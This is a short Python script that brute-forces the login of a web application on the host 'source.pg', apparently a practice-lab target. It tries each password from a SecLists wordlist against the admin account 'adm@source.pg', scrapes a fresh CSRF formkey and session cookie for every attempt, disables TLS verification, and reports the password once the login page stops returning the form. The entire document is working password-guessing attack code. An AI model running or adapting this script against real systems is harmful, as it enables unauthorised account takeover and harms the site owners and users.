#!/usr/bin/python3

import requests
import re
import time

def main():

    port = '443'
    host = "source.pg"
    email = "adm@source.pg"
    wordlist = '/usr/share/seclists/Passwords/fasttrack.txt'
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
    with open(wordlist, encoding = 'utf-8') as f:
        for password in f:
            password = password.strip().replace('\n','')
            session = requests.Session()
            session.verify = False
            url = 'https://' + host + ':' + port + '/login.php'
            r = session.get(url, cookies="")
            cookie_dict = session.cookies.get_dict()
            formkey = re.findall(r'formkey\' value=\'(\w*)', r.text)
            sessionPost = requests.Session()
            sessionPost.verify=False
            url = 'https://' + host + ':' + port + '/app/controllers/LoginController.php'
            cookie = {'PHPSESSID': cookie_dict['PHPSESSID']}
            header = {'Content-Type': 'application/x-www-form-urlencoded'}
            postdata ={'email': email,'password': password, 'formkey': formkey}
            print(f'Checking password: {password}')
            r = sessionPost.post(url, cookies=cookie, data=postdata, headers=header)
            if not 'formkey' in r.text:
                 print(f"Found password: {password}")
                 break
            time.sleep(3)
            
if __name__ == "__main__":
    main()
